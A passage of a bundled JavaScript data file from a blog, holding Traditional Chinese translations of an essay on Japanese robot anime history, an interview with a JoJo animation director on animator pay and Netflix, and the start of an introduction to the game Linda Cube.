年代年輕人靈魂的最大要素。</p>\n<p>在正要迎來泡沫經濟的 80 年代初期，年輕人們的關注力落在戀愛、音樂與流行服飾上。全共鬥時代的熱血對於他們而言已經是不符潮流的，在兩位美女之間游疑不定的一條輝所表現出的輕率態度，更加符合 80 年代時的年輕人。從當時的人氣漫畫《橙路》和《相聚一刻》的主角都是和輝十分相似的角色這點，能看出這並不是偶然。</p>\n<p>在輝身邊的女主角們，也是極為 80 年代的。偶像歌手的林明美是當時人氣最高的動畫女主角，但她的刻劃是非常現代的女性的。視野狹隘、由感情驅動、即物主義、任性。這樣說來可能會讓人認為她是個高傲的惡女，實際上來看實則並非如此。觀眾能在畫面裡感受到真實而生動的女性的可愛。…或許女性本質上就是這樣的生物吧（這是偏見嗎？）。以及另一位女主角早瀨女沙，雖然表面上是個不起眼而昏暗的軍人士官，她的溫順女性的深情也十分引人玩味。</p>\n<p>這些十分具有真實性的女性描寫，是試圖逃避現實的全共鬥世代，必然地做不出來的東西。全共鬥世代，例如宮崎駿和高橋良輔、押井守，都有著將女性極端地理想化的傾向。一心地等待著男性的歸來，即使面對困境也不會有所怨言，僅是持續地忍耐…。這說白了是封建時代的女性形象。少女漫畫裡的 8 頭身王子大人都比這更有真實感。</p>\n<p>話說回來，《超時空要塞》終盤故事異常地無趣，殲滅波多爾扎艦隊之後，回到地球的後續故事只剩下復興作業，故事的趣味焦點落在「輝在最後究竟會選擇明美還是美沙」，淪為單純的愛情故事。因為《超時空要塞》本應是在打倒波德爾扎的第 27 話就要做結的。但是看見收視率而高揚的贊助商，決定強迫要求延長節目。這種「少年 JUMP」上相當普遍的現象，在動畫的世界裡也是司空見慣。</p>\n<p>而這些贊助商的動向，正是 80 年代動畫熱潮最大的關鍵。</p>\n<h2 id=\"80-年代大熱潮背後的深淵\">80 年代大熱潮背後的深淵</h2>\n<p>為什麼機器人動畫在進入 80 年代後會如此爆紅？</p>\n<p>答案很簡單，因為能賺到錢。</p>\n<p>原本機器人動畫是有玩具公司在背後當贊助商才能成立的。大多數的情況裡玩具公司會在設定階段就參與製作，對機器人的設計提出意見。動畫機器人的造型會是比較簡便的外型，是因為這樣設定更容易商品化成模型或超合金玩偶。大河原邦彥是代表這個時代的巨星設計師。</p>\n<p>在《鋼彈》之前，機器人動畫的觀眾大多是小學生以下的小孩和他們的雙親。市場利益其實並不多。沒有人氣的動畫很容易在途中就被腰斬。《鋼彈》的首次收視率其實也十分糟糕，在中途就中斷了播放。原定作品的總長是 52 集，卻在第 43 集就成了最終話。《鋼彈》的後期會出現許多敵方的新兵器，也是製作人員為了取悅贊助商的策略吧。然而節目腰斬已成確定事項，使得故事最後的發展顯得十分急躁。但對贊助商而言這是最好的選擇吧。畢竟這對他們而言也不是兒事。</p>\n<p>但這時發生了出乎意料的事態。《鋼彈》的再次放映造成了異常的爆紅。以及令人訝異的是，過去不會繼續觀看機器人動畫的中學生與高中生所出現的動靜。他們爭相搶購「鋼彈」的模型（後稱鋼普拉）。玩具製造商萬代不斷地增產，供給卻跟不上需求，大排長龍的鋼普拉狂熱者，甚至出現了有人因為推擠而受到重傷的事態。</p>\n<p>玩具商這時發現，機器人動畫能夠賺錢！</p>\n<p>因此各家玩具商開始爭相參加這個「新興」市場。動畫製作者也一同搭上這波潮流。只要向玩具商示意，就能得到作品製作的委託。無所事事的新銳作家們，也趁機加緊腳步。造就了 80 年代的機器人動畫大熱潮。</p>\n<p>但這終究是商業主義下的熱潮，作家群們無法逃離贊助商的束縛，例如《太陽之牙》和《超時空要塞》的世界裡，登場兵器與機器人之間的必然性實際上相當薄弱。由戰車和直升機所組成的戰鬥機器（達格拉姆）還能讓人理解，但在宇宙空間裡戰鬥的戰鬥機女武神（Macross）實在看不出變形成機器人的必然性何在。這是贊助商認為「機器人才能賣得更好」、「變型和合體的東西才更好賣」而強推所導致的結果。不自然的機器人兵器的登場，使得許多得來不易的優秀 SF 作品出現缺點。</p>\n<p>更大的問題是「腰斬」或「延長」，故事的起承轉合核心架構是在一開始就已決定好的，在中途能修改的僅有在這之上的部份。然而只顧著賺錢的贊助商，會毫不留情地在途中結束賺不到錢的動畫，讓能賺錢的動畫延長播放。也就是會截斷骨架、自行串接。《太陽之牙》途中開始拖延進度，以及《超時空要塞》結尾的淺薄，都是模型賣得太好導致的悲劇。</p>\n<p>得意忘形的贊助商強迫動畫家們過度製造，使得創作者們陷入疲憊，作品品質日漸下滑，讓這巨大的熱潮，在 85 年後便開始潰堤失勢。</p>\n<p>我認為 80 年代的日本 SF 動畫，放眼世界來看也是非常高水準的。但卻因為毫無同情心的商業主義者們而變得如此扭曲，實在使人懊悔。我們應當學到教訓，真正的藝術是絕對不會從商業主義之中誕生的。</p>\n<h2 id=\"新世紀福音戰士\">新世紀福音戰士</h2>\n<p>80 年代泡沫破碎的機器人動畫界，暫時陷入了低迷之中。過度的濫造使得許多作家的才能枯竭，往後所製造的動畫，多是 80 年代動畫的翻製。例如《鋼彈》和《超時空要塞》這類人氣品牌至今仍有續作。</p>\n<p>客觀地來看，機器人動畫很明顯地已經飽和化、走到了瓶頸。這個失去了自信的國家，已經無法再培育出像永井豪和長濱忠夫這樣的先驅者。</p>\n<p>直到 90 年代後半，出現了一部嶄新手法的大熱門作品，也就是《新世紀福音戰士》。然而這是部以極為雜技的「奇襲」劇作法作出的作品，因而無法成為下個世代的標準。但它仍對日後的日本動畫和 SF 電影造成了相當巨大的影響，例如怪獸電影《卡美拉 3》、《鐵甲機》都很明顯地對《新世紀福音戰士》有所意識。</p>\n<p>那麼，來看看人們稱為機器人動畫最後光明的《新世紀福音戰士》吧。</p>\n<blockquote>\n<p>＜作品介紹＞</p>\n<p>在近未來的 2015 年，地球因為於 20 世紀末在南極所引發的第二次衝擊造成的神秘劇變，大多數的陸地沉進水中。</p>\n<p>殘存的人類，這次是受到了名為「使徒」的謎之巨大生命體的襲擊。「使徒」不知為何十分執著地攻擊著日本的第 3 新東京市（過去的箱根強羅地區）的地下都市。</p>\n<p>日本政府為了反擊「使徒」，組成特務機關 NERV。以及由 NERV 所製造的巨大人造人，新世紀福音戰士 (Evangelion)。總計 3 架的機器人的搭乘者，是經由嚴格的審查後所挑選出來，稱為「children」的 14 歲的少年少女。</p>\n<p>主角少年碇真嗣，被父親擔任所長的 NERV 挑選為 EVA 初號機的駕駛員。軟弱的真嗣一邊與恐怖感戰鬥著，一邊間斷地打倒襲來的「使徒」。</p>\n<p>然而 NERV 有著真嗣所不曉得的一面。NERV 真正的目的是，執行讓衰退的人類轉化成完全不同的生命體的「人類補完計畫」。「使徒」是為了阻止這項計畫的執行而攻擊 NERV 的異種生命體。</p>\n<p>當最後的「使徒」被擊倒，「人類補完計畫」開始執行。人類將成為全新世界的居民。</p>\n</blockquote>\n<p>從上述內容裡能看出，作品的氛圍是更有動作戲，比起《鋼彈》（當時的標準）感覺上更像是《奧特曼》。這是因為導演是《奧特曼》的狂熱粉絲。</p>\n<p>我在第一次看完這部作品後，所感受到的是遍佈於整部作品的「不安感」。不只是主角真嗣，觀眾們到最後也無法把握整個世界的全貌。這部作品直到最後，故事仍然是主角在未知的異常狀況裡，和未知的奇特怪物戰鬥。因為缺乏重要的資訊，使得人越發不安。</p>\n<p>然而許多觀眾仍然會觀賞這部作品到最後的理由，是因為登場人物（尤其是主角真嗣）的刻劃方式十分地有魅力吧。觀眾們會對登場人物感同身受，和主角用著相同的視角體會到「不安感」。</p>\n<p>在這之前的機器人動畫，必定會有世界觀的說明或是狀況的說明，使得觀眾能夠安心融入幻想世界，享受機器人的活躍，《新世紀福音戰士》顛覆了以往的常識。</p>\n<p>而使得觀眾更加不安的，就是大多數的登場人物都是「人格異常者」或「偏頗人格」這點吧，特別是大人更是如此。</p>\n<p>NERV 局長的碇源堂是個會為了目的不擇手段，冷酷無情的男人。即使自己的兒子真嗣陷入苦境，也只會在一旁冷笑。在這對親子之間直到最後仍然不見人性的情愛。我認為擁有這樣家長的真嗣，仍沒走入惡行便已很了不起了。</p>\n<p>源堂左右手的科學家赤木律子，在她美貌背後的真正樣貌是位瘋狂科學家。</p>\n<p>女主角（?）葛城美里是 NERV 的作戰指揮官，以理解主角們的大姐頭角色所活躍。但到後面也會發現，這個人也因為受困於過去的陰霾而沉迷於酒精。</p>\n<p>大人裡唯一正常的，只有加持良治這位青年，這個人卻因為過於正常（?）而在故事中期遭到殺害。</p>\n<p>EVA 的駕駛員們也相當慘淡。真嗣的同伙，兩位 14 歲的少女在人格上都有問題。</p>\n<p>綾波零是個完全沒有對於自身的思考與意志的少女。也就是會對大人言聽計從，宛如人偶般缺乏自我的人。因此最危險的任務通常是交給她執行，本人也會帶著撲克臉接下，想必她的精神力相當地強軔。但她令我聯想到新興宗教的信徒，我相當討厭她。為什麼這樣的角色會有那麼高的人氣呢？如今她就像是青年御宅族們的女神一樣。甚至等身大的綾波人偶 (價格超過 3 萬日圓) 都賣得相當好。買這種東西是要用做什麼？真是恐怖哪。不過，這或許也是這個社會已經病了的一例吧。</p>\n<p>惣流．明日香．蘭格雷和綾波完全相反，是個滿是自我與自尊的少女。總是要求自己位居第一，看不起其它同伙。然而實際上相當軟弱，因為一點挫折便身心俱疲，最後成為廢人般的狀態。在東大出身的菁英裡也有無法適應社會而自殺的人，明日香便是這一類的人。我比起綾波更對她有所同感。雖然這兩人都頗有問題。</p>\n<p>而在這方面來說，主角的少年真嗣，可說是個令人訝異地極為正常的普通少年。唯一的缺點是他較為軟弱，看待事物比較消極。不過也是因為身邊的人物滿是異常者，才讓他顯得較為正常吧。</p>\n<p>無法掌握作品世界的全貌，而登場人物全是異常者的這個故事裡，充滿著謎團與不安。</p>\n<p>這種充斥於全體的「不安感」可說是《新世紀福音戰士》能如此爆紅的原因吧。</p>\n<p>90 年代後半的日本，經歷泡沫崩壞、經濟衰退出現連鎖效應，人們被逼進看不見未來的窘境裡，少年少女犯下的罪行成為一大社會問題。《新世紀福音戰士》明確地表現出了這種社會的不安感，也就是乘上了「時代性」的波瀾。</p>\n<p>這也是我稱呼這部作品的成功為「奇襲」的理由。</p>\n<p>不過，在 80 年代的《超時空要塞》，才剛以搖盪不定而輕率態度的世界觀獲得「時代性」。僅在過了 10 年後就崩塌蕩然無存。日本社會的異常急變，在此能看出明確的展現。</p>\n<p>然而在《新世紀福音戰士》的熱潮已經過去 5 年的現在，社會狀況並沒有出現太大的的變化。當時的「奇襲」性的作品時代性仍然殘留於這個社會，我認為某方面上這是相當令人悲傷的。</p>\n<h2 id=\"總結\">總結</h2>\n<p>統整上述內容，我們可以得到機器人動畫在日本廣泛流行的理由。</p>\n<p>戰後漫畫和動畫的「大元老」手塚治蟲很喜歡機器人，在許多他所創作的漫畫和動畫之中都有機器人活躍的身影。</p>\n<p>因為日本製動畫確立了低成本生產的模式，培養出了能接連孕育出許多十分具冒險性的作品的環境。</p>\n<p>橫山光輝、永井豪、長濱忠夫、富野喜幸這些優秀的創作者們，接二連三地加入劃時代的點子，使得世界更加活潑。</p>\n<p>許多玩具製造商加入市場，提供了相當優沃的資金。因此許多創作者們得以進行實驗性的嘗試。</p>\n<p>而其中最為重要的因素就是第 4 點吧。但也因此使得「沒有機器人的 SF 作品」的發展空間受限，十分可惜。</p>\n<p>現今日本的機器人動畫已經成為在國際上顯耀的「文化」。我想所謂的「文化」就是如此形成的。所以若是你在讀過這篇文章後，能夠感受到這世上許多事物都是充滿著歷史、傳統與文化，不會輕笑地說「不就是機器人動畫嗎」，對筆者而言已經是無上的喜悅了。</p>\n<p>★ 這篇論述是於 1998 年因為其它原因而開始撰寫的文章的修改增訂版。</p>\n","date":"2020-04-26T19:26:09.000Z","excerpt":"","printDate":"April 26, 2020","printReadingTime":"3 min read"};

var route_35 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod16
});

var Mod17 = {"title":"【譯】動畫版《JOJO》總作畫監督指摘「即使 Netflix 給了更多動畫製作費，這些錢也回饋不到現場的動畫師手上」","slug":"ACG-interview-of-jojo-sakuga-director","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.itmedia.co.jp/business/articles/2006/25/news013.html\">https://www.itmedia.co.jp/business/articles/2006/25/news013.html</a></p>\n<p>有本書回覆了對於世界上受人注目的一大內容產業，日本的動畫業界裡蔓延的低薪和長時間勞動的，苛刻工作環境實際狀況的疑問，那就是玄光社出版的『<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.amazon.co.jp/dp/4768312799?tag=itmedia-business-22&amp;linkCode=ogi&amp;th=1&amp;psc=1\">アニメーターの仕事がわかる本</a>』（這本書帶你看懂動畫師的工作）。而這本書的獨特之處，就在於其中一位著者，是位正在動畫業界第一線活躍的現役動畫師。</p>\n<p>我們之前曾經有在上一篇文章「<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.itmedia.co.jp/business/articles/2006/24/news023.html\">アニメ版『ジョジョ』の総作画監督が語るアニメーター業界の「過酷な実態」</a>」（動畫版《JOJO》總作畫監督談論動畫師業界的「苛刻真相」）裡訪問這位動畫師西位輝實，談過目前制作現場的問題。</p>\n<p>西村在 1999 年畢業於專門學校後，就開始從事動畫師的行業，過去曾經經手過《蟲師》和《Casshern Sins》等作品的作畫監督。在 2011 年首次擔任《轉吧！企鵝罐》的角色設計後，也接任了《JoJo 的奇妙冒險 第四部 不滅鑽石》和《劇場版窈窕淑女前編～紅緒、花樣的 17 歲～》的角色設計。</p>\n<p>《<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.amazon.co.jp/dp/4768312799?tag=itmedia-business-22&amp;linkCode=ogi&amp;th=1&amp;psc=1\">アニメーターの仕事がわかる本</a>》一書是採用由自由記者餅井アンナ提問，西村回答的形式撰寫，內容涵概了從動畫師的具體工作內容到勞動環境，以及收入和酬勞單價這類和詳細數字有關的話題，可說十分寫實。其中更有不少像是「當事人以為自己是公司員工，但實際上只是簽約的自由業」這種大幅偏離一般社會常識的狀況。</p>\n<p>在這篇文章裡，我們則是向西村輝實問道，關於以 Netflix 為首，進年開始進軍日本動畫業界的，海外資本的產業狀況。</p>\n<h2 id=\"ip-歸於企業-動畫師沒有任何權利\">IP 歸於企業 動畫師沒有任何權利</h2>\n<p>—— 在動畫制作現場已經如此苛刻的狀況下，每一季還是有這麼多的作品製作出來。這背後原因是什麼呢？</p>\n<p>雖然我們至今都稱這是動畫業界，但以前規模其實是沒那麼大的，大概是「只要能讓 DVD 和玩具賣得出去就過得去」的感覺。直到開始有人認為動畫本身也有價值，認為這個業界是能賺錢的，才有許多人加入了這個產業之中。</p>\n<p>完全不懂動畫，也不喜歡動畫的企業，突然來收購動畫工作室。不熟捻動畫的企業，突然開起動畫公司。這些人心裡所想的，其實就只是想要擁有自己的 IP 【※】而已。</p>\n<blockquote>\n<p>※ IP：「Intellectual Property （智慧財產）」的簡稱。原意是指由人類的創造性活動所產生出的資訊、設計和點子等等的總稱，這裡所指的則主要是由創作所產生出的原創著作物。</p>\n</blockquote>\n<p>—— 原來如此。只要有了 IP 的權利，作品大賣時就能賣週邊，透過各種商業模式大賺一筆對吧。</p>\n<p>但我希望大家知道的是，實際在制作這 IP 的現場是非常拮据貧困的。甚至以目前的預算來說，都不曉得能不能撐到內容實際播出。這真的是我們目前的狀況。</p>\n<p>—— 前陣子我們去採訪了中國的動畫《羅小黑戰記》的製作團隊，這部作品的原作者（監督）同時也是工作室的董事，所以 IP 是在制作公司自身手上的。JAniCA 【※】代表理事長入江泰浩對此高度讚賞。</p>\n<blockquote>\n<p>※ JAniCA：一般社團法人日本動畫師．演出協會的簡稱。積極投入「動畫製作者實態調查」、參與改進動畫業界勞動環境問題。動畫師／演出家的入江泰浩為本協會的代表理事</p>\n</blockquote>\n<p>其實日本也該這樣作的，現在日本的情況是「IP 全都是贊助企業的，你們就努力作吧」的狀態。所以現在最重要的事應該是，創作者保有自己作品的權利，自行進行業務經營。只是照著企業所說的去接案，個人就無法保有 IP。</p>\n<p>海外的企業則不是這樣的。當他們提出「和我們一起工作吧」是會好好認同創作者的權利的。日本的合約內容裡卻必定會寫有「放棄著作者人格權」。</p>\n<p>—— 也就是說，日本的合約是制作作品的當事人，不能主張對於作品的權利嗎？</p>\n<p>是的。我也能理解想要讓創作者「放棄著作者人格權」的想法。因為我們是以非常大型的團隊在制作的，如果其中有個人說了「我不要」，那就會讓整個作業停下來。不過當然也會覺得他可以採取不同的抱怨方式。</p>\n<p>而如果是遊戲公司的話，就會更加嚴格，有不少遊戲公司的合約是有寫著「禁止向外面透露自己負責這份工作」的。</p>\n<p>—— 家用主機遊戲的製作者名單記載雖然比以前更加詳細了，但手機遊戲則到現在幾乎都還是很不透明呢。</p>\n<p>例如手遊的插畫就很難看到著名。對於自由業的我來說，不能當成自己的成績公開，不能放到作品集裡，就會有種「這幾年下來我到底做了些什麼？」的感覺。</p>\n<p>—— 西村您的情況來說，則還有「動畫版《JOJO》的總作畫監督」的成績能使用呢。</p>\n<p>是的。我非常感激能以這份成果自居。但從海外的角度來看，日本動畫這樣的情況仍然是十分怪異的。海外的公司想和日本動畫簽約時，還會問說「你們的權利持有人也太少了吧？這麼大規模的作品，應該是有更多持有權利人的吧？」呢（笑）。</p>\n<h2 id=\"即使-netflix-給了更多動畫製作費，這些錢也回饋不到現場的動畫師手上\">即使 Netflix 給了更多動畫製作費，這些錢也回饋不到現場的動畫師手上</h2>\n<p>—— 說到海外，最近也有聽聞 Netflix 和中國企業這些海外的資金，讓動畫業界變得豐饒了。這件事對於動畫師們是件好事嗎？</p>\n<p>在我所接觸到的範圍內來說，並沒有造成什麼變化。大家可能會聽到 Netflix 的作品預算是一般行情的 2 倍，但這並不是說動畫師的作業單價就會跟著變成 2 倍。制作公司也沒有因此顯得笑不攏嘴的樣子，而是依然相當地辛苦。</p>\n<p>—— 制作公司沒有覺得景氣好轉的話，那錢是被誰賺走了？</p>\n<p>我耳聞到的是，制作公司是將這些錢轉到包含數位化的設備投資上，以及為了應對勞動基準法的制作公司整頓裡頭。並且有許多公司原本就是赤字的。</p>\n<p>—— 好景氣進來的錢，也只是拿去填補赤字而已？</p>\n<p>說起來這就像是一場雨下到砂漠上，水份全被砂石所吸光，無法培育出任何植物。不過如果這種大規模的委託能夠一定程度上的定期化，或許又不一樣了。</p>\n<p>—— 日本的電視動畫，大部份應該都是一邊播放一邊在進行著制作。而 Netflix 採取的是先一次完成全部的制作，例如 1 季 13 話就先做好 13 話的量，才將作品上架串流。這在作業上是否是更加辛苦的？</p>\n<p>很辛苦呢（笑）。像交貨期間的合約似乎也是比日本的電視台更嚴格。但我並不是製作人，所以對這塊也不是很清楚。</p>\n<p>但是，Netflix 全額出資製作的作品，理所當然地會是 Netflix 的 IP，但制作公司自己制作，再帶去給 Netflix 的作品，IP 就會歸制作公司所有。</p>\n<p>—— 也就是 Netflix 付錢先買下第 1 年的放映獨佔權，之後才在一般電視台上播放的類型的作品呢。</p>\n<p>Netflix 完全出資的作品雖然會有 2 到 3 倍的制作費，但 IP 不在自家公司手上，就沒辦法推出週邊商品或 DVD。所以也有許多公司選擇自己作完，只賺 Netflix 串流的錢就好。因為想做中長期培養的作品，被 Netflix 給拿走就沒有意義了。</p>\n<p>雖然對於我們這些承包制作的動畫師或制作工作室來說，IP 都是保不住的。</p>\n<p>—— 所以即使有了 Netflix，制作現場還是一如既往？</p>\n<p>沒有什麼改變呢。那些合約相關的東西，也只是 Netflix 和委員會以及第一承包制作公司的事情，是我們這些 freelancer 的動畫師接觸不到的。也有人問過「Netflix 的作品待遇也很不錯吧？」，我個人的感想是這因合約而異，不能一概而論。</p>\n<p>除了 Netflix 之外，中國那邊也因為中國政府的審查變得更嚴格，因此有無法再制作作品的情況。經商的人都會把這些歐美和中國的案子捧成「黑船來襲！」，但其中當然也是存在風險的。</p>\n<h2 id=\"探索動畫以外的繪畫工作的可能性\">探索動畫以外的繪畫工作的可能性</h2>\n<p>—— 而西村您則是有以個人的身份直接接受海外的發案嗎？</p>\n<p>我是透過 Crunchyroll【※】的前日本分公司社長 ビンス・ショーティノ 擔任我的經紀人的形式，替我處理海外的業務。他是位人脈相當廣闊的人，替我四處探訪了許多人。我也是因為幸運而能有著這樣特殊的情況。</p>\n<blockquote>\n<p>※ Crunchyroll：面向超過 200 個以上的國家，以串流提供日本的動畫和漫畫的企業（但日本並不能存取這些資源）。ビンス・ショーティノ 自 2008 年此公司於日本設立法人時擔任代表公司董事，後於 2017 年退職。</p>\n</blockquote>\n<p>—— 您是怎麼認識 ビンス・ショーティノ 的？</p>\n<p>我在摸索著如何能夠確保除了動畫以外的收入來源時，在 Anime Japan 【※】的聚會上經由介紹所認識的。</p>\n<p>因為 ビンス 任職於日本分公司，他對於日本動畫的製作委員會的箇中情況相當瞭解。他也很常把「我很討厭那種一問三不知的負責人」掛在嘴邊。認為海外將負責人劃分得相當清楚，我可能比較適合在這樣的環境下工作。</p>\n<blockquote>\n<p>※ Anime Japan：各大代表日本動畫的相關企業與團體參加展出的，世界最大規模的動畫活動。每年通常於春天舉辦，但「Anime Japan 2020」因為武漢肺炎的影響而中止了。</p>\n</blockquote>\n<p>—— 您也曾經試圖經營動畫以外的收入來源嗎？</p>\n<p>是的，那是差不多在 2 年前，結束了《JOJO》和《窈窕淑女》之後的事。其實是在製作《窈窕淑女》的時候，因為參與制作的公司破產，幾乎快因為壓力而倒下。做這行真的是只有滿滿的苦差事。</p>\n<p>因為發生了這樣的事，讓我產生了「這樣實下去在太沒有希望了」的念頭而對動畫業界感到絕望。從而決定尋找動畫業界以外的工作，並開始參加遊戲業界的聚會。</p>\n<p>—— 遊戲業界的收入會比動畫更好嗎？</p>\n<p>這會因工作形式而異，但通常是遊戲業比較好。只是我當時接到的遊戲工作很容易會延期或擱置。動畫業界的工作是拿了錢就一定會做到最後，但遊戲業界卻會有花了數億日圓的企劃案突然中止的狀況，令我十分衝擊。但我還是賺到了比在動畫業界更多的錢（笑）。</p>\n<p>在我這樣因為生活過得十分不順遂，摸索該如何是好的時期，映入眼廉的選項之一便是海外。</p>\n<p>—— 您也有參加過「BRAVE &amp; BOLD」這場委託活動，這也是除了動畫以外的經營活動的一環嗎？</p>\n<blockquote>\n<p>※Commision Event：海外的漫畫相關活動多是採取創作者接受粉絲的提案，收取費用後繪製插圖的「Commision」形式。近年來日本也有越來越多這種酬庸形式的插圖頒佈活動。</p>\n</blockquote>\n<p>一開始參加「BRAVE &amp; BOLD」的時候還不是這麼想的。</p>\n<p>我以前會和客人直接互動的情況只有在 Comike 的時候，但在 Comike 大家都很手忙腳亂的。酬庸活動的話，雖然現在因為委託數量變多，我已經改成採取事前預約的形式，一開始是當場接受委託，並且就此成形的。</p>\n<p>不過我確實有想過這種活動成為繪圖的擔保之一的潛力。</p>\n<p>—— 您做了不少摸索呢。</p>\n<p>我很常被動畫業界裡認識的人說「你在幹嘛啊？」。雖然現在也還是很常被這樣說（笑）。</p>\n<h2 id=\"只執著在動畫上是會出大事的\">只執著在動畫上是會出大事的</h2>\n<p>—— 西村您是怎麼看待現在想要成為動畫師的人？</p>\n<p>如果是我的話我肯定不會想進入這行的（笑）。雖然真的很感激有人如此喜歡動畫。</p>\n<p>我曾經去過許多專科學校，通常是插畫科的人比動畫科的人還多。希望成為動畫師的人大多都是比較溫馴的。插畫科的人會很積極地湊上來，動畫科的人則不是如此，這令我有些擔心。</p>\n<p>因為繪師原本就有很多人是因為不擅長交涉，或是不想做這些事才選擇畫圖當成工作的，所以我很希望業界的環境能轉變成讓動畫師成為公司員工，並且不需要再去做交涉的事務。</p>\n<p>—— 會有作畫工作室這樣的形態，原本就是因為背後有這樣的理由吧。</p>\n<p>確實如此，我曾經問過工作室的前輩「為什麼你不辭職？」，他說「因為公司能替我處理那些麻煩的交涉」。我待在工作室裡也沒有發生過什麼問題。但和動畫業界以外的人聊到這樣的業務形態時，他們都會對此大吃一驚（笑）。</p>\n<p>但作畫工作室應該也比起以前更少了。我以前待過的地方也解散了。更多人選擇採取 freelancer、個人接案、在家工作的形式。</p>\n<p>—— 是這樣子啊。</p>\n<p>因為做動畫這一行，有作品在推動的時候還沒什麼問題，一但作品停下來了金流也就會整個停下來。但公司還是得招攬更多的員工，這可說是對所有的公司來說都很痛苦的一點吧。</p>\n<p>雖然我認為原因還是在案子的單價太便宜了。但如果有更多的預算，讓工作室也能劃分進公司員工裡，或許能讓待遇更好一點。但像我這種已經做了 freelancer 20 年的人，事到如今突然要成為員工聽從公司的話，也是有些不情願。但我認為將收入較低，仍然在學習著工作內容的新人納入公司員工，是件相當重要的事情。</p>\n<p>總之我認為培養新人是目前的重點。也就是所謂的中割。不從這塊重新整治的話，現在的動畫業界是走不下去的。</p>\n<p>—— 包含海外作品與遊戲業界在內，西村您認為現在最有「搞頭」的，是哪個方向性的工作呢？</p>\n<p>全部都有搞頭。雖然是這樣說…因為我曾經一度對動畫絕望過，並且包含現在的制作方式在內也有許多跟不上的部份。所以相較之下，其它都是有搞頭的（笑）。</p>\n<p>目前的動畫可以說是相當混亂的時期。包含轉形到數位化的部份。所以我希望能等到整體更穩定了，或是確立起了自己的風格後，再以個人的身份投入其中吧。也是因為在這個十分混雜的時期裡，照著其它人說的做，會不曉得最後究竟走到何處。</p>\n<p>對我來說是只要能夠畫圖就好，這是我的基準點。而且只執著在動畫上是會出大事的。我已經 40 歲了，是時候該思考老年之後的事。</p>\n<h2 id=\"希望大家能更認識現在動畫業界的真實狀況\">希望大家能更認識現在動畫業界的真實狀況</h2>\n<p>—— 對於您來說，詢問身為第一線創作者的西村您這些事，讓您直接面對這些問題，您個人是怎麼想的呢。</p>\n<p>我原本也很煩惱。很大原因是我現在沒有主要從事的作品。如果是我在制作《JOJO》的時候，就肯定不會有《<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.amazon.co.jp/dp/4768312799?tag=itmedia-business-22&amp;linkCode=ogi&amp;th=1&amp;psc=1\">アニメーターの仕事がわかる本</a>》這本書了。因為會對很多人造成困擾。現在我和動畫業界比較有點距離，不會直接對作品造成困擾，就覺得應該也沒關係吧。</p>\n<p>—— 那麼您如此深談這個問題的理由是？</p>\n<p>「憤怒」吧。包含除了我之外的人在內，大家都如此地努力，為什麼卻得不到回報!? 因為喜歡才來做這份工作，理應可以再過得更好一點的。</p>\n<p>而基本上敵人是不存在的。「希望這部作品能夠大熱獲得人氣」是公司和第一線的從業人員們都共同有的想法。但這也十分困難。</p>\n<p>—— 您在小時候看了《聖鬥士星矢》而對其抱有憧憬，現在成為了 Netflix 的《聖鬥士星矢：黃道十二宮戰士》的角色設計。</p>\n<p>是的。我自己因為有著憧憬的作品而加入動畫業界，並且實現了自己想做的事，但所留下來的卻是「憤怒」令我十分不滿。</p>\n<p>我希望動畫粉絲們能夠更加認識現在業界的真實狀況。雖然遇到中止電視播映的時候，粉絲們都會留些像「正確的判斷」、「我支持你們」很溫柔的留言，但這件事其實相當嚴重。制作公司會直接少掉一大筆錢。</p>\n<p>所以我希望各位粉絲能更理解現在動畫的真實狀況，各大企業和制作公司也應該為了這些粉絲們，更加思考如何改進動畫的制作方式。</p>\n","date":"2020-08-27T21:37:25.000Z","excerpt":"","printDate":"August 27, 2020","printReadingTime":"2 min read"};

var route_13 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod17
});

var Mod18 = {"title":"【譯】過早出現的成人寶可夢？奇妙異色 RPG《Linda Cube》","slug":"ACG-linda-cube-introduction","html":"<p>在 AMD（After Mothers Death，指地球死亡之日）1991 年，在和地球非常相似的星球「新肯亞」。生活在其上的人類們知道了 8 年後將會有無法迴避的巨大隕石襲向新肯亞。在從新肯亞逃脫的人類脫出計畫著實地進行時，突然收到了一封來自「方舟」宇宙船號稱神明的訊息。</p>\n<p>「我想拯救這個星球的動物。因此，請讓各種動物的雌雄各一。以及人類的男女各一名搭乘上這艘方舟」</p>\n<p>這份來源不明的情報卻受到政府的支持，而這艘船的乘員這對男女，也就是主角和女主角所志願的。在隕石不斷迫近新肯亞時，不曉得將會如何的「方舟計畫」開始了。</p>\n<p>Linda Cube 共有 3 個遊戲劇情的劇本 ABC（在 PS、SS 版裡還有原創的 D 劇本），有著各自所設定好的動物捕獲數量和結束條件。這 3 個劇本是以平行世界的關係所連接的，雖然有著同樣的登場人物，但其境遇皆有所不同。</p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://i.imgur.com/o3TCizR.png\"><img src=\"https://i.imgur.com/o3TCizR.png\" alt=\"img\"></a></p>\n<p>△ 和兔子的戰鬥，遊戲中的動物皆是以地球上長相相近的物種命名，採用四面環繞型的特殊戰鬥機制</p>\n<p>當初桝田省治受夠了製作天外魔境裡約定俗成的 RPG 模式，所以連同了天外魔境的 STAFF 慢慢作出這款遊戲，「可以說天外魔境 2 是離 Linda 最近也最遠的遊戲」，也因為不想被劇本綁死，所以劇情為重的劇本 A，劇本 B 都只是為了「釣起玩家的餌」，是「新手訓練」，原本的目的「收集動物」則成了輔助性的要素，知名的色情和獵奇內容也皆在劇本 AB 裡。，另一方面桝田真正想製作的自由 RPG 型遊戲內容的劇本 C 則沒有明確的故事。是採取需先有過對於劇本 AB 的理解後，再到 C 裡充份地享受「收集動物」的遊戲架構。</p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://i.imgur.com/ApgFAfO.jpg\"><img src=\"https://i.imgur.com/ApgFAfO.jpg\" alt=\"img\"></a></p>\n<p>△ 駛向星辰大海的方舟。距離隕石襲來還有 8 年……。\n這是僅有兩人的少年少女，為了拯救這顆星球的動物們而戰鬥的故事。</p>\n<h3 id=\"◎-以往-rpg-的約定俗成皆不通用。\">◎ 以往 RPG 